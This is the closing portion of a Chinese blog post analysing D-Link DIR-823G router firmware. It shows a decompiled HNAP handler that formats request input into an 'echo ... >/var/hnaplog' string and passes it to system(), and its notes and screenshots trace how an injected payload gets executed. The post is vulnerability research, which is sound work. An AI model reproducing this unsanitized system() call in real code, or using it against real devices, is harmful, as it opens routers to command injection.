+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> ( dword_58A6C4 = (<span class="hljs-type">int</span>)&amp;off_588D80; *(_DWORD *)dword_58A6C4; dword_58A6C4 += <span class="hljs-number">8</span> )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strstr</span>(*(_DWORD *)(a1 + <span class="hljs-number">1316</span>), *(_DWORD *)dword_58A6C4) )<br>  &#123;<br>    <span class="hljs-comment">// 如果在 a1 + 1316 处的字符串中找到 *(_DWORD *)dword_58A6C4 指向的子字符串</span><br><br>    <span class="hljs-comment">// 执行一些操作，包括记录日志和条件判断</span><br>    <span class="hljs-built_in">memset</span>(v17, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(v17));<br>    <span class="hljs-built_in">snprintf</span>(v17, <span class="hljs-number">4999</span>, <span class="hljs-string">&quot;echo &#x27;%s&#x27; &gt;/var/hnaplog&quot;</span>, a11);<br>    <span class="hljs-built_in">system</span>(v17);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wp-&gt;hnapfunc===========&gt;%s\n&quot;</span>, *(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">1316</span>));<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(*(_DWORD *)dword_58A6C4, <span class="hljs-string">&quot;GetLocalMac&quot;</span>, <span class="hljs-number">11</span>) )<br>    &#123;<br>      <span class="hljs-comment">// 如果 *(_DWORD *)dword_58A6C4 指向的字符串与 &quot;GetLocalMac&quot; 前 11 个字符匹配</span><br>      <span class="hljs-built_in">memset</span>(&amp;unk_58A6A0, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>      <span class="hljs-built_in">strncpy</span>(&amp;unk_58A6A0, a1 + <span class="hljs-number">48</span>, <span class="hljs-number">32</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( (*(<span class="hljs-built_in">int</span> (__fastcall **)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(dword_58A6C4 + <span class="hljs-number">4</span>))(a11) )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个for循环是用来遍历参数的</p>
+<p>直接打断点下到if判断里面</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005447427.png" srcset="/img/loading.gif" lazyload alt="image-20240804005447427"></p>
+<p>payload由栈上存入寄存器</p>
+<p>进入sprintf开始拼接系统命令</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803235729615.png" srcset="/img/loading.gif" lazyload alt="image-20240803235729615"></p>
+<p>拼接完成后执行system</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240904144238898.png" srcset="/img/loading.gif" lazyload alt="image-20240904144238898"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>dir-823G固件分析</div>
+      <div>http://groundctl2majortom.github.io/2024/07/07/dir-823G固件分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/08/%E5%8D%8E%E7%A1%95-RT-N15U-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="华硕_RT-N15U_命令执行漏洞分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">华硕_RT-N15U_命令执行漏洞分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/04/%E5%90%88%E5%8B%A4NWA1100%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/" title="合勤NWA1100固件提取">
+                        <span class="hidden-mobile">合勤NWA1100固件提取</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
